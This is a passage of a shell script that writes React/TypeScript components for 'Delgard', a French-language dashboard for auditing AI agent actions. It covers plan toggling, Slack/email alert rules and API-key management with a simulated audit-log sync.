              <div className="w-14 h-14 rounded-lg bg-teal-500/20 text-teal-300 font-semibold text-xl flex items-center justify-center">
                {user?.name?.charAt(0) || "U"}
              </div>
            )}
            <div>
              <h3 className="font-semibold text-white text-base">{user?.name || "Alex Rivera"}</h3>
              <p className="text-xs text-slate-400">{user?.email || "alex.rivera@delgard.dev"}</p>
              <span className="inline-block mt-1 text-[10px] font-bold px-2 py-0.5 rounded bg-slate-800 text-teal-400 border border-slate-700 uppercase">
                Provider : {user?.provider || "GitHub"}
              </span>
            </div>
          </div>

          <div className="text-xs text-slate-400 space-y-2 pt-1">
            <div className="flex justify-between">
              <span>ID Supabase Auth :</span>
              <span className="font-mono text-slate-300 truncate max-w-[140px]">{user?.id?.substring(0, 18)}...</span>
            </div>
            <div className="flex justify-between">
              <span>Table des profils :</span>
              <span className="text-teal-400 font-mono">public.profiles</span>
            </div>
          </div>
        </div>

        {/* Plan Status and Manual Toggle Box */}
        <div className="md:col-span-2 bg-[#111C33] border border-[#1E293B] rounded-lg p-6 shadow-xl space-y-6">
          <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 border-b border-slate-800 pb-5">
            <div>
              <span className="text-xs font-bold uppercase tracking-wider text-slate-400 block mb-1">
                Plan Actuel dans votre table <code className="text-teal-400">profiles</code>
              </span>
              <div className="flex items-center gap-3">
                <span className="text-2xl font-semibold text-white uppercase tracking-tight">
                  Formule : {plan === "pro" ? "PRO (Équipe & Webhooks)" : "GRATUIT (Individuel)"}
                </span>
                <span
                  className={clsx(
                    "px-2.5 py-1 rounded-full text-xs font-semibold flex items-center gap-1",
                    plan === "pro"
                      ? "bg-[color:var(--accent)] text-[#0B1220]"
                      : "bg-slate-800 text-slate-300 border border-slate-700"
                  )}
                >
                  {plan === "pro" ? <Zap className="w-3.5 h-3.5 fill-current" /> : <Lock className="w-3.5 h-3.5" />}
                  <span>{plan.toUpperCase()}</span>
                </span>
              </div>
            </div>

            {/* Manual Switcher (Exact requirement) */}
            <div className="flex items-center bg-[#0B1220] p-1.5 rounded-md border border-slate-800 self-stretch sm:self-auto">
              <button
                onClick={() => onTogglePlan("free")}
                className={clsx(
                  "px-4 py-2 rounded-lg font-bold text-xs transition-all flex-1 sm:flex-auto text-center",
                  plan === "free"
                    ? "bg-slate-700 text-white shadow"
                    : "text-slate-400 hover:text-white"
                )}
              >
                Plan Gratuit
              </button>
              <button
                onClick={() => onTogglePlan("pro")}
                className={clsx(
                  "px-4 py-2 rounded-lg font-bold text-xs transition-all flex items-center justify-center gap-1.5 flex-1 sm:flex-auto",
                  plan === "pro"
                    ? "bg-[color:var(--accent)] text-[#0B1220] shadow"
                    : "text-slate-400 hover:text-teal-400"
                )}
              >
                <Zap className="w-3.5 h-3.5 fill-current" />
                <span>Plan Pro</span>
              </button>
            </div>
          </div>

          <div className="bg-[#0B1220] border border-slate-800 rounded-md p-4 text-xs text-slate-300 flex items-start gap-3">
            <Database className="w-5 h-5 text-teal-400 flex-shrink-0 mt-0.5" />
            <div>
              <span className="font-bold text-white block mb-1">
                Note sur la modification manuelle en base de données :
              </span>
              Conformément à l&apos;architecture delgard, aucun système de paiement (Stripe/PayPal) n&apos;est branché pour l&apos;instant. Le champ <code className="bg-slate-800 text-teal-300 px-1 py-0.5 rounded">plan</code> de la table <code className="bg-slate-800 text-teal-300 px-1 py-0.5 rounded">profiles</code> peut être mis à jour via ce sélecteur pour tester instantanément les règles RLS et le déverrouillage des fonctionnalités Pro, ou directement via le SQL Editor de Supabase (<code className="text-slate-400">UPDATE profiles SET plan = &apos;pro&apos; WHERE id = ...</code>).
            </div>
          </div>

          {/* Plan Comparison Table */}
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs pt-2">
            <div
              onClick={() => onTogglePlan("free")}
              className={clsx(
                "p-4 rounded-lg border transition-all cursor-pointer",
                plan === "free" ? "border-slate-500 bg-slate-800/40" : "border-slate-800 bg-[#0B1220]"
              )}
            >
              <h4 className="font-semibold text-sm text-white mb-2 flex items-center justify-between">
                <span>Formule Gratuit</span>
                <span className="text-slate-400 text-xs font-normal">0 € / mois</span>
              </h4>
              <ul className="space-y-2 text-slate-300">
                <li className="flex items-center gap-2">
                  <CheckCircle2 className="w-4 h-4 text-teal-400 flex-shrink-0" />
                  <span>Journal d&apos;audit (recherche, timeline lisible)</span>
                </li>
                <li className="flex items-center gap-2">
                  <CheckCircle2 className="w-4 h-4 text-teal-400 flex-shrink-0" />
                  <span>Historique limité aux 7 derniers jours</span>
                </li>
                <li className="flex items-center gap-2 text-slate-500">
                  <Lock className="w-4 h-4 flex-shrink-0" />
                  <span className="line-through">Policy partagée en équipe (agenttrust.yml)</span>
                </li>
                <li className="flex items-center gap-2 text-slate-500">
                  <Lock className="w-4 h-4 flex-shrink-0" />
                  <span className="line-through">Alertes automatiques Webhook Slack & Email</span>
                </li>
              </ul>
            </div>

            <div
              onClick={() => onTogglePlan("pro")}
              className={clsx(
                "p-4 rounded-lg border transition-all cursor-pointer relative overflow-hidden",
                plan === "pro"
                  ? "border-teal-500 bg-teal-500/10 shadow-none"
                  : "border-slate-800 bg-[#0B1220] hover:border-teal-500/40"
              )}
            >
              <div className="absolute top-0 right-0 bg-teal-500 text-[#0B1220] text-[9px] font-semibold px-2 py-0.5 rounded-bl">
                RECOMMANDÉ
              </div>
              <h4 className="font-semibold text-sm text-white mb-2 flex items-center justify-between">
                <span>Formule Pro</span>
                <span className="text-teal-400 text-xs font-semibold">Sur devis / Contact</span>
              </h4>
              <ul className="space-y-2 text-slate-200">
                <li className="flex items-center gap-2">
                  <CheckCircle2 className="w-4 h-4 text-teal-400 flex-shrink-0" />
                  <span>Journal d&apos;audit complet</span>
                </li>
                <li className="flex items-center gap-2 font-bold text-teal-300">
                  <CheckCircle2 className="w-4 h-4 text-teal-400 flex-shrink-0" />
                  <span>Historique illimité (100% des logs conservés)</span>
                </li>
                <li className="flex items-center gap-2 font-bold text-white">
                  <CheckCircle2 className="w-4 h-4 text-teal-400 flex-shrink-0" />
                  <span>Policy partagée en équipe (agenttrust.yml dans l&apos;interface)</span>
                </li>
                <li className="flex items-center gap-2 font-bold text-white">
                  <CheckCircle2 className="w-4 h-4 text-teal-400 flex-shrink-0" />
                  <span>Alertes automatiques (Email & Slack Webhooks)</span>
                </li>
              </ul>
            </div>
          </div>
        </div>
      </div>

      {/* "Contactez-nous pour passer Pro" card (Exact requirement) */}
      <div className="bg-gradient-to-r from-teal-500/15 via-emerald-500/10 to-[#111C33] border-2 border-teal-500/40 rounded-3xl p-8 shadow-2xl flex flex-col md:flex-row items-center justify-between gap-6">
        <div className="space-y-2 text-center md:text-left">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-teal-500/20 text-teal-300 font-semibold text-xs border border-teal-500/30">
            <Sparkles className="w-3.5 h-3.5" />
            <span>Passez à l&apos;échelle en entreprise</span>
          </div>
          <h3 className="text-xl font-semibold text-white">
            Contactez-nous pour passer Pro ou déployer sur votre cluster privé
          </h3>
          <p className="text-xs text-slate-300 max-w-xl leading-relaxed">
            Pour les équipes gérant de vastes essaims d&apos;agents autonomes (AutoGPT, CrewAI, LangChain), nous proposons un accompagnement sur mesure, une assistance à la rédaction d&apos;agenttrust.yml, et des garanties SLA.
          </p>
        </div>

        <form onSubmit={handleContactSubmit} className="w-full md:w-auto flex flex-col sm:flex-row gap-2.5">
          <input
            type="email"
            placeholder="votre.email@entreprise.com"
            required
            className="bg-[#0B1220] border border-slate-700/80 rounded-md px-4 py-3 text-xs text-white focus:outline-none focus:border-teal-500 min-w-[240px]"
          />
          <button
            type="submit"
            className="px-6 py-3 rounded-md bg-[color:var(--accent)] hover:bg-[#26bfab] text-[#0B1220] font-semibold text-xs whitespace-nowrap shadow-none transition-all flex items-center justify-center gap-2"
          >
            <span>Contacter l&apos;équipe Delgard</span>
            <ArrowRight className="w-4 h-4" />
          </button>
        </form>
      </div>

      {contactSent && (
        <div className="p-4 rounded-lg bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 text-xs font-bold text-center animate-in fade-in">
          ✅ Message bien reçu ! Un ingénieur sécurité de l&apos;équipe Delgard prendra contact avec vous sous 24 heures.
        </div>
      )}
    </div>
  );
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/components"
cat > "src/components/AlertsView.tsx" << 'DELGARD_FILE_EOF_9f3a2b'
"use client";

import React, { useState, useEffect } from "react";
import {
  BellRing,
  Plus,
  Trash2,
  Lock,
  Zap,
  Mail,
  MessageSquare,
  AlertTriangle,
  CheckCircle2,
  ShieldAlert,
} from "lucide-react";
import clsx from "clsx";

interface AlertsViewProps {
  plan: string;
  onTogglePlan: (newPlan: string) => void;
}

export function AlertsView({ plan, onTogglePlan }: AlertsViewProps) {
  const [alerts, setAlerts] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [channel, setChannel] = useState<"slack" | "email">("slack");
  const [target, setTarget] = useState("");
  const [triggerBlock, setTriggerBlock] = useState(true);
  const [triggerApproval, setTriggerApproval] = useState(true);
  const [creating, setCreating] = useState(false);
  const [status, setStatus] = useState<{ type: "success" | "error"; text: string } | null>(null);

  const fetchAlerts = async () => {
    setLoading(true);
    try {
      const res = await fetch("/api/alerts");
      const data = await res.json();
      if (data.ok) {
        setAlerts(data.alerts || []);
      }
    } catch (err) {
      console.error("Failed to fetch alerts:", err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchAlerts();
  }, [plan]);

  const handleCreateAlert = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!target.trim()) return;
    setCreating(true);
    setStatus(null);

    const triggerOn: string[] = [];
    if (triggerBlock) triggerOn.push("block");
    if (triggerApproval) triggerOn.push("approval-required");

    if (triggerOn.length === 0) {
      setStatus({ type: "error", text: "Sélectionnez au moins une condition de déclenchement (block ou approval-required)." });
      setCreating(false);
      return;
    }

    try {
      const res = await fetch("/api/alerts", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ channel, target: target.trim(), triggerOn }),
      });
      const data = await res.json();
      if (res.ok && data.success) {
        setStatus({ type: "success", text: `Canal d'alerte ${channel.toUpperCase()} configuré et activé !` });
        setTarget("");
        fetchAlerts();
      } else {
        setStatus({ type: "error", text: data.error || "Erreur de configuration (Plan Pro requis)" });
      }
    } catch (err: any) {
      setStatus({ type: "error", text: "Erreur réseau: " + err?.message });
    } finally {
      setCreating(false);
    }
  };

  const handleDeleteAlert = async (id: string) => {
    if (!confirm("Supprimer ce canal d'alerte automatique ?")) return;
    try {
      await fetch(`/api/alerts?id=${encodeURIComponent(id)}`, { method: "DELETE" });
      fetchAlerts();
    } catch (err) {
      console.error("Failed to delete alert:", err);
    }
  };

  // Locked state check
  if (plan === "free") {
    return (
      <div className="space-y-6 animate-in fade-in duration-300">
        <div className="bg-[#111C33] border border-amber-500/30 rounded-3xl p-8 md:p-12 text-center shadow-2xl relative overflow-hidden">
          <div className="absolute -left-10 -top-10 w-64 h-64 bg-teal-500/5 rounded-full blur-3xl pointer-events-none" />
          
          <div className="w-16 h-16 rounded-3xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 mx-auto mb-6 shadow-xl shadow-amber-500/10">
            <Lock className="w-8 h-8 animate-bounce" />
          </div>

          <h2 className="text-2xl font-semibold text-white mb-3">
            Alertes Automatiques en Temps Réel Verrouillées
          </h2>
          <p className="text-sm text-slate-300 max-w-xl mx-auto mb-8 leading-relaxed">
            La formule <span className="text-amber-400 font-bold">Gratuite</span> permet la visualisation du journal d&apos;audit en ligne. Pour être alerté automatiquement par <span className="text-white font-bold">email</span> ou <span className="text-white font-bold">webhook Slack</span> dès qu&apos;une action IA est bloquée ou nécessite une approbation, passez au plan <span className="text-teal-400 font-bold">Pro</span>.
          </p>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 max-w-2xl mx-auto mb-8 text-left">
            <div className="bg-[#0B1220]/80 border border-slate-800 p-4 rounded-lg flex items-start gap-3.5">
              <div className="w-10 h-10 rounded-md bg-purple-500/10 text-purple-400 flex items-center justify-center flex-shrink-0 font-bold">
                <MessageSquare className="w-5 h-5" />
              </div>
              <div>
                <h4 className="font-bold text-white text-xs mb-1">Webhooks Slack & Discord</h4>
                <p className="text-[11px] text-slate-400">
                  Recevez un message instantané dans un canal dédié dès que l&apos;agent tente d&apos;exécuter un script bash non autorisé ou un DROP TABLE.
                </p>
              </div>
            </div>

            <div className="bg-[#0B1220]/80 border border-slate-800 p-4 rounded-lg flex items-start gap-3.5">
              <div className="w-10 h-10 rounded-md bg-teal-500/10 text-teal-400 flex items-center justify-center flex-shrink-0 font-bold">
                <Mail className="w-5 h-5" />
              </div>
              <div>
                <h4 className="font-bold text-white text-xs mb-1">Notifications Email Sécurité</h4>
                <p className="text-[11px] text-slate-400">
                  Transmettez un rapport immédiat au RSSI et aux responsables d&apos;équipe dès l&apos;interception d&apos;une action à haut risque.
                </p>
              </div>
            </div>
          </div>

          <button
            onClick={() => onTogglePlan("pro")}
            className="px-8 py-4 rounded-lg bg-gradient-to-r from-teal-500 via-emerald-600 to-teal-500 hover:brightness-110 text-[#0B1220] font-semibold text-sm shadow-none transition-all transform inline-flex items-center gap-2.5"
          >
            <Zap className="w-5 h-5 fill-current" />
            <span>Tester immédiatement en mode Pro (Débloquer les Alertes)</span>
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-8 animate-in fade-in duration-300">
      {/* Top Pro Header */}
      <div className="bg-[#111C33] border border-teal-500/30 rounded-lg p-6 shadow-xl flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2.5 mb-1">
            <h1 className="text-xl font-semibold text-white">Alertes & Webhooks Sécurité</h1>
            <span className="text-xs font-bold px-2.5 py-0.5 rounded-full bg-teal-500/20 text-teal-300 border border-teal-500/40 flex items-center gap-1">
              <Zap className="w-3 h-3 fill-current" />
              <span>PLAN PRO ACTIF</span>
            </span>
          </div>
          <p className="text-xs text-slate-400">
            Configurez les canaux de notification déclenchés en temps réel lors de l&apos;analyse des logs d&apos;audit.
          </p>
        </div>

        <button
          onClick={() => onTogglePlan("free")}
          className="px-3.5 py-1.5 rounded-md bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold border border-slate-700 self-stretch sm:self-auto text-center"
        >
          Tester la vue Gratuit (verrouillage)
        </button>
      </div>

      {status && (
        <div
          className={`p-4 rounded-md text-xs flex items-center gap-2.5 border ${
            status.type === "success"
              ? "bg-emerald-500/10 text-emerald-300 border-emerald-500/30"
              : "bg-red-500/10 text-red-300 border-red-500/30"
          }`}
        >
          <CheckCircle2 className="w-4 h-4 flex-shrink-0" />
          <span>{status.text}</span>
        </div>
      )}

      {/* Grid: Create Alert + List Alerts */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Create Alert Form Card */}
        <div className="bg-[#111C33] border border-[#1E293B] rounded-lg p-6 shadow-xl h-fit">
          <h2 className="text-base font-semibold text-white mb-1 flex items-center gap-2">
            <Plus className="w-4 h-4 text-teal-400" />
            <span>Ajouter une règle d&apos;alerte</span>
          </h2>
          <p className="text-xs text-slate-400 mb-5">
            Choisissez le canal et les conditions de déclenchement (block / approval).
          </p>

          <form onSubmit={handleCreateAlert} className="space-y-4">
            <div>
              <label className="block text-xs font-semibold text-slate-300 mb-1.5">Type de canal</label>
              <div className="grid grid-cols-2 gap-2 bg-[#0B1220] p-1.5 rounded-md border border-slate-800">
                <button
                  type="button"
                  onClick={() => setChannel("slack")}
                  className={clsx(
                    "py-2 px-3 rounded-lg text-xs font-bold transition-all flex items-center justify-center gap-2",
                    channel === "slack"
                      ? "bg-teal-500/20 text-teal-300 border border-teal-500/30"
                      : "text-slate-400 hover:text-white"
                  )}
                >
                  <MessageSquare className="w-3.5 h-3.5" />
                  <span>Slack Webhook</span>
                </button>
                <button
                  type="button"
                  onClick={() => setChannel("email")}
                  className={clsx(
                    "py-2 px-3 rounded-lg text-xs font-bold transition-all flex items-center justify-center gap-2",
                    channel === "email"
                      ? "bg-teal-500/20 text-teal-300 border border-teal-500/30"
                      : "text-slate-400 hover:text-white"
                  )}
                >
                  <Mail className="w-3.5 h-3.5" />
                  <span>Email</span>
                </button>
              </div>
            </div>

            <div>
              <label className="block text-xs font-semibold text-slate-300 mb-1.5">
                {channel === "slack" ? "URL du Webhook Slack / Discord" : "Adresse Email de destination"}
              </label>
              <input
                type={channel === "email" ? "email" : "url"}
                value={target}
                onChange={(e) => setTarget(e.target.value)}
                placeholder={
                  channel === "slack"
                    ? "https://hooks.slack.com/services/T00/.../..."
                    : "security-ops@delgard.dev"
                }
                required
                className="w-full bg-[#0B1220] border border-slate-700/80 rounded-md py-2.5 px-3.5 text-xs text-white focus:outline-none focus:border-teal-500 transition-colors placeholder:text-slate-600 font-mono"
              />
            </div>

            <div>
              <label className="block text-xs font-semibold text-slate-300 mb-2">Déclencher sur les décisions :</label>
              <div className="space-y-2 text-xs">
                <label className="flex items-center gap-2.5 cursor-pointer bg-[#0B1220] p-2.5 rounded-md border border-slate-800">
                  <input
                    type="checkbox"
                    checked={triggerBlock}
                    onChange={(e) => setTriggerBlock(e.target.checked)}
                    className="w-4 h-4 rounded border-slate-700 text-teal-500 focus:ring-0"
                  />
                  <span className="font-bold text-red-400">Action bloquée (block)</span>
                </label>

                <label className="flex items-center gap-2.5 cursor-pointer bg-[#0B1220] p-2.5 rounded-md border border-slate-800">
                  <input
                    type="checkbox"
                    checked={triggerApproval}
                    onChange={(e) => setTriggerApproval(e.target.checked)}
                    className="w-4 h-4 rounded border-slate-700 text-teal-500 focus:ring-0"
                  />
                  <span className="font-bold text-amber-400">Approbation requise (approval-required)</span>
                </label>
              </div>
            </div>

            <button
              type="submit"
              disabled={creating}
              className="w-full py-3 rounded-md bg-[color:var(--accent)] hover:bg-[#26bfab] text-[#0B1220] font-semibold text-xs shadow-none transition-all flex items-center justify-center gap-2 disabled:opacity-50"
            >
              <BellRing className="w-4 h-4 fill-current" />
              <span>{creating ? "Activation..." : "Créer le canal d'alerte"}</span>
            </button>
          </form>
        </div>

        {/* Alerts List */}
        <div className="lg:col-span-2 bg-[#111C33] border border-[#1E293B] rounded-lg overflow-hidden shadow-xl">
          <div className="p-5 border-b border-[#1E293B] flex items-center justify-between">
            <div>
              <h2 className="text-base font-semibold text-white">Règles Actives ({alerts.length})</h2>
              <p className="text-xs text-slate-400">Toutes les alertes sont en écoute des événements Edge Function</p>
            </div>
          </div>

          {loading ? (
            <div className="p-12 text-center text-slate-400 text-xs">Chargement des alertes...</div>
          ) : alerts.length === 0 ? (
            <div className="p-12 text-center text-slate-400 text-xs">
              Aucune alerte configurée pour l&apos;instant. Utilisez le formulaire à gauche pour en créer une.
            </div>
          ) : (
            <div className="divide-y divide-[#1E293B]">
              {alerts.map((a) => (
                <div key={a.id} className="p-5 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 hover:bg-slate-800/30 transition-colors">
                  <div className="flex items-start gap-3.5">
                    <div
                      className={clsx(
                        "w-10 h-10 rounded-md flex items-center justify-center font-bold flex-shrink-0 mt-0.5",
                        a.channel === "slack" && "bg-purple-500/15 text-purple-400 border border-purple-500/30",
                        a.channel === "email" && "bg-teal-500/15 text-teal-400 border border-teal-500/30"
                      )}
                    >
                      {a.channel === "slack" ? <MessageSquare className="w-5 h-5" /> : <Mail className="w-5 h-5" />}
                    </div>

                    <div className="space-y-1">
                      <div className="flex items-center gap-2">
                        <span className="font-semibold text-sm text-white uppercase tracking-wider">{a.channel}</span>
                        <span className="text-xs font-mono text-teal-300 break-all">{a.target}</span>
                      </div>

                      <div className="flex items-center gap-2 text-xs">
                        <span className="text-slate-400">Triggers :</span>
                        {a.triggerOn?.map((t: string) => (
                          <span
                            key={t}
                            className={clsx(
                              "px-2 py-0.5 rounded text-[10px] font-semibold",
                              t === "block" && "bg-red-500/15 text-red-400 border border-red-500/30",
                              t === "approval-required" && "bg-amber-500/15 text-amber-400 border border-amber-500/30"
                            )}
                          >
                            {t.toUpperCase()}
                          </span>
                        ))}
                      </div>
                    </div>
                  </div>

                  <button
                    onClick={() => handleDeleteAlert(a.id)}
                    className="p-2 rounded-md bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/30 transition-colors self-end sm:self-auto"
                    title="Supprimer cette alerte"
                  >
                    <Trash2 className="w-4 h-4" />
                  </button>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/components"
cat > "src/components/ApiKeysView.tsx" << 'DELGARD_FILE_EOF_9f3a2b'
"use client";

import React, { useState, useEffect } from "react";
import {
  KeyRound,
  Plus,
  Trash2,
  Copy,
  CheckCircle2,
  ShieldAlert,
  Terminal,
  Clock,
  Sparkles,
  AlertCircle,
  Play,
  Check,
} from "lucide-react";
import clsx from "clsx";

interface ApiKeysViewProps {
  onRefreshLogs?: () => void;
}

export function ApiKeysView({ onRefreshLogs }: ApiKeysViewProps) {
  const [keys, setKeys] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [newLabel, setNewLabel] = useState("");
  const [isCreating, setIsCreating] = useState(false);
  const [newlyCreatedSecret, setNewlyCreatedSecret] = useState<{ secret: string; label: string } | null>(null);
  const [copied, setCopied] = useState(false);

  // CLI Simulator State
  const [simKeyInput, setSimKeyInput] = useState("");
  const [simIssuer, setSimIssuer] = useState("LangChain-Orchestrator v0.3");
  const [simSubject, setSimSubject] = useState("agent-code-interpreter");
  const [simAction, setSimAction] = useState("exec:bash -c 'echo \"System checked\" && whoami'");
  const [simDecision, setSimDecision] = useState("allow");
  const [simReason, setSimReason] = useState("Policy match: Whitelisted bash inspection command");
  const [simStatus, setSimStatus] = useState<{ type: "success" | "error"; text: string; details?: any } | null>(null);
  const [simulating, setSimulating] = useState(false);

  const fetchKeys = async () => {
    setLoading(true);
    try {
      const res = await fetch("/api/keys");
      const data = await res.json();
      if (data.ok) {
        setKeys(data.keys || []);
        // Set default simulator key if none filled and raw key secret not active
        if (!simKeyInput && data.keys?.length > 0) {
          setSimKeyInput("dlg_live_demo_key_99887766554433221100");
        }
      }
    } catch (err) {
      console.error("Failed to load keys:", err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchKeys();
  }, []);

  const handleCreateKey = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!newLabel.trim()) return;
    setIsCreating(true);
    try {
      const res = await fetch("/api/keys", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ label: newLabel.trim() }),
      });
      const data = await res.json();
      if (data.success) {
        setNewlyCreatedSecret({ secret: data.rawKeySecret, label: data.keyRecord.label });
        setSimKeyInput(data.rawKeySecret); // Auto populate simulator for instant testing!
        setNewLabel("");
        fetchKeys();
      }
    } catch (err) {
      console.error("Error creating key:", err);
    } finally {
      setIsCreating(false);
    }
  };

  const handleRevoke = async (id: string) => {
    if (!confirm("Voulez-vous vraiment révoquer cette clé API ? Tout CLI utilisant cette clé sera immédiatement refusé (401).")) {
      return;
    }
    try {
      const res = await fetch(`/api/keys?id=${encodeURIComponent(id)}`, { method: "DELETE" });
      const data = await res.json();
      if (data.success) {
        fetchKeys();
      }
    } catch (err) {
      console.error("Failed to revoke key:", err);
    }
  };

  const handleCopySecret = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleSimulateSync = async (e: React.FormEvent) => {
    e.preventDefault();
    setSimulating(true);
    setSimStatus(null);

    try {
      const payload = [
        {
          entry_hash: "sha256_" + Math.random().toString(36).substring(2, 15) + Date.now().toString(16),
          prev_hash: "sha256_prev_" + Math.random().toString(36).substring(2, 10),
          issuer: simIssuer,
          subject: simSubject,
          action: simAction,
          decision: simDecision,
          reason: simReason,
          occurred_at: new Date().toISOString(),
        },
      ];

      const res = await fetch("/api/sync-audit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${simKeyInput}`,
        },
        body: JSON.stringify(payload),
      });

      const data = await res.json();

      if (res.ok && data.success) {
        setSimStatus({
          type: "success",
          text: `Succès : ${data.synchronized_count} entrée(s) synchronisée(s) vers Supabase pour la clé '${data.api_key_label}'.`,
          details: data.entries,
        });
        fetchKeys(); // Refresh last_used_at
        if (onRefreshLogs) onRefreshLogs();
      } else {
        setSimStatus({
          type: "error",
          text: data.error || "Erreur lors de la synchronisation (401 / 400)",
        });
      }
    } catch (err: any) {
      setSimStatus({ type: "error", text: "Erreur réseau: " + err?.message });
    } finally {
      setSimulating(false);
    }
  };

  return (
    <div className="space-y-8 animate-in fade-in duration-300">
      {/* Header Info Banner */}
      <div className="bg-[#111C33] border border-[#1E293B] rounded-lg p-6 shadow-lg flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2 mb-1.5">
            <h1 className="text-xl font-semibold text-white">Clés API (Authentification Machine CLI)</h1>
            <span className="text-xs font-bold px-2.5 py-0.5 rounded-full bg-teal-500/10 text-teal-400 border border-teal-500/30">
              SHA-256 Hashed Storage
            </span>
          </div>
          <p className="text-xs text-slate-400 max-w-3xl leading-relaxed">
            Ces clés API permettent au CLI <code className="text-teal-400 bg-slate-800 px-1.5 py-0.5 rounded font-mono">delgard</code> ou à vos agents IA autonomes d&apos;envoyer des logs d&apos;audit sans navigateur (<code className="text-slate-300">Authorization: Bearer &lt;clé&gt;</code>).
            Conformément aux bonnes pratiques de sécurité Supabase, **la clé en clair n&apos;est affichée qu&apos;une seule fois lors de la création** puis seul son hash SHA-256 est conservé en base.
          </p>
        </div>
      </div>

      {/* One-time Secret Alert Modal/Card */}
      {newlyCreatedSecret && (
        <div className="bg-gradient-to-r from-emerald-500/15 via-teal-500/10 to-[#111C33] border-2 border-emerald-500/50 rounded-lg p-6 shadow-2xl animate-in zoom-in-95 duration-200">
          <div className="flex items-start justify-between gap-4 mb-4">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-md bg-emerald-500/20 text-emerald-400 flex items-center justify-center font-bold">
                <Sparkles className="w-5 h-5 animate-spin" />
              </div>
              <div>
                <h3 className="text-base font-semibold text-emerald-300">
                  Nouvelle Clé API Générée : &quot;{newlyCreatedSecret.label}&quot;
                </h3>
                <p className="text-xs text-slate-300">
                  ⚠️ Copiez cette clé en clair immédiatement. Pour des raisons de sécurité, **elle ne sera plus jamais accessible ni affichable après fermeture.**
                </p>
              </div>
            </div>
            <button
              onClick={() => setNewlyCreatedSecret(null)}
              className="text-slate-400 hover:text-white bg-slate-800/80 p-1.5 rounded-lg text-xs font-bold"
            >
              ✕ Fermer cet encart
            </button>
          </div>

          <div className="bg-[#0B1220] border border-emerald-500/40 rounded-md p-4 flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3 font-mono text-sm">
            <span className="text-emerald-300 break-all select-all font-semibold">
              {newlyCreatedSecret.secret}
            </span>
            <button
              onClick={() => handleCopySecret(newlyCreatedSecret.secret)}
              className="px-4 py-2 rounded-lg bg-emerald-500 hover:bg-emerald-400 text-[#0B1220] font-semibold text-xs flex items-center justify-center gap-2 transition-all flex-shrink-0"
            >
              {copied ? (
                <>
                  <Check className="w-4 h-4 stroke-[3]" />
                  <span>Copié dans le presse-papier !</span>
                </>
              ) : (
                <>
                  <Copy className="w-4 h-4" />
                  <span>Copier la clé en clair</span>
                </>
              )}
            </button>
          </div>
        </div>
      )}

      {/* Grid: Create Key + List Keys */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Create Form Card */}
        <div className="bg-[#111C33] border border-[#1E293B] rounded-lg p-6 shadow-xl h-fit">
          <h2 className="text-base font-semibold text-white mb-1 flex items-center gap-2">
            <Plus className="w-4 h-4 text-teal-400" />
            <span>Générer une nouvelle clé CLI</span>
          </h2>
          <p className="text-xs text-slate-400 mb-5">
            Attribuez un label explicite pour identifier la machine ou le cluster d&apos;agents.
          </p>

          <form onSubmit={handleCreateKey} className="space-y-4">
            <div>
              <label className="block text-xs font-semibold text-slate-300 mb-1.5">
                Label / Environnement
              </label>
              <input
                type="text"
                value={newLabel}
                onChange={(e) => setNewLabel(e.target.value)}
                placeholder="ex: Prod Multi-Agent Cluster, Worker LangGraph #2..."
                required
                className="w-full bg-[#0B1220] border border-slate-700/80 rounded-md py-2.5 px-3.5 text-xs text-white focus:outline-none focus:border-teal-500 transition-colors placeholder:text-slate-600"
              />
            </div>

            <button
              type="submit"
              disabled={isCreating}
              className="w-full py-3 rounded-md bg-[color:var(--accent)] hover:bg-[#26bfab] text-[#0B1220] font-semibold text-xs shadow-none transition-all flex items-center justify-center gap-2 disabled:opacity-50"
            >
              <KeyRound className="w-4 h-4 fill-current" />
              <span>{isCreating ? "Génération cryptographique..." : "Créer la clé API"}</span>
            </button>
          </form>

          <div className="mt-5 pt-5 border-t border-[#1E293B] text-[11px] text-slate-400 space-y-2">
            <div className="flex items-center gap-2">
              <ShieldAlert className="w-4 h-4 text-teal-400 flex-shrink-0" />
              <span>Format du préfixe : <code className="text-teal-300">dlg_live_xxxx...</code></span>
            </div>
            <div className="flex items-center gap-2">
              <Clock className="w-4 h-4 text-slate-500 flex-shrink-0" />
              <span>Délai de validité : illimité jusqu&apos;à révocations</span>
            </div>
          </div>
        </div>

        {/* Existing Keys Table */}
        <div className="lg:col-span-2 bg-[#111C33] border border-[#1E293B] rounded-lg overflow-hidden shadow-xl">
          <div className="p-5 border-b border-[#1E293B] flex items-center justify-between">
            <div>
              <h2 className="text-base font-semibold text-white">Clés API Actives ({keys.length})</h2>
              <p className="text-xs text-slate-400">Gérez vos clés de synchronisation et vérifiez leur dernière utilisation</p>
